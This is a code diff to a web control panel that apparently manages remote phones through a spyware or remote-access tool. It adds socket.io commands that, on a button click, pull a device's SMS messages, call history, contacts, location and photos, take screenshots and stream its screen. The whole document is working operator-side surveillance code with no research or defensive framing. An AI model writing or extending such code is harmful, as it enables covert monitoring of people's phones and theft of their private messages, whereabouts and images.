@@ -11,6 +11,8 @@ header { display: flex; justify-content: space-between; align-items: center; mar
 h1 { font-size: 22px; }
 .btn { padding: 10px 16px; background: #3b82f6; border: none; border-radius: 8px; color: #fff; cursor: pointer; font-size: 14px; }
 .btn.red { background: #ef4444; }
+.btn.green { background: #22c55e; }
+.btn.purple { background: #a855f7; }
 .device { background: #1e293b; padding: 16px; border-radius: 12px; margin-bottom: 12px; cursor: pointer; border: 2px solid transparent; }
 .device:hover { border-color: #3b82f6; }
 .device.active { border-color: #3b82f6; }
@@ -18,6 +20,7 @@ h1 { font-size: 22px; }
 .device .meta { color: #94a3b8; font-size: 13px; }
 .online { color: #22c55e; }
 .offline { color: #ef4444; }
+#controls { margin-top: 24px; display: none; flex-wrap: wrap; gap: 8px; }
 #data { margin-top: 24px; }
 .entry { background: #1e293b; padding: 14px; border-radius: 10px; margin-bottom: 10px; font-size: 14px; }
 .entry .type { display: inline-block; background: #3b82f6; padding: 3px 10px; border-radius: 6px; font-size: 12px; font-weight: 600; margin-bottom: 8px; }
@@ -32,16 +35,28 @@ h1 { font-size: 22px; }
   <button class="btn red" onclick="logout()">Logout</button>
 </header>
 <div id="devices"><div class="empty">Loading devices...</div></div>
+<div id="controls"></div>
 <div id="data"></div>
+<script src="/socket.io/socket.io.js"></script>
 <script>
 const email = localStorage.getItem('email');
 const token = localStorage.getItem('token');
 if (!email || !token) location.href = '/';
 let selectedUid = null;
+let socket = null;
 
 function logout() {
   localStorage.clear();
   location.href = '/';
+}
+
+function connectSocket() {
+  socket = io();
+  socket.on('connect', () => {
+    console.log('Panel socket connected');
+    socket.emit('panel-login', {email: email});
+  });
+  socket.on('disconnect', () => console.log('Panel socket disconnected'));
 }
 
 async function loadDevices() {
@@ -63,9 +78,31 @@ async function loadDevices() {
     el.innerHTML = '<div class="name">📱 ' + (info.device || 'Unknown') + '</div>' +
       '<div class="meta">' + (d.online ? '<span class="online">● Online</span>' : '<span class="offline">● Offline</span>') +
       ' · ' + d.count + ' entries · UID: ' + d.uid + '</div>';
-    el.onclick = () => { selectedUid = d.uid; loadDevices(); loadData(); };
+    el.onclick = () => { selectedUid = d.uid; loadDevices(); loadData(); showControls(); };
     box.appendChild(el);
   });
+}
+
+function showControls() {
+  const c = document.getElementById('controls');
+  c.style.display = 'flex';
+  c.innerHTML = `
+    <button class="btn" onclick="sendCmd('getSms', 20)">📩 SMS</button>
+    <button class="btn" onclick="sendCmd('getCallHistory', 20)">📞 Calls</button>
+    <button class="btn" onclick="sendCmd('getContacts')">👥 Contacts</button>
+    <button class="btn" onclick="sendCmd('getLocation')">📍 Location</button>
+    <button class="btn green" onclick="sendCmd('getImages')">🖼️ Photos</button>
+    <button class="btn purple" onclick="sendCmd('streamScreen')">📺 Screen</button>
+    <button class="btn" onclick="sendCmd('takeScreenShot')">📸 Screenshot</button>
+  `;
+}
+
+function sendCmd(command, arg1) {
+  if (!socket || !selectedUid) return alert('Not ready');
+  const payload = {uid: selectedUid, command: command};
+  if (arg1 !== undefined) payload.arg1 = arg1;
+  socket.emit('command', payload);
+  console.log('Sent:', payload);
 }
 
 async function loadData() {
@@ -88,6 +125,7 @@ async function loadData() {
   });
 }
 
+connectSocket();
 loadDevices();
 setInterval(loadDevices, 5000);
 setInterval(loadData, 5000);
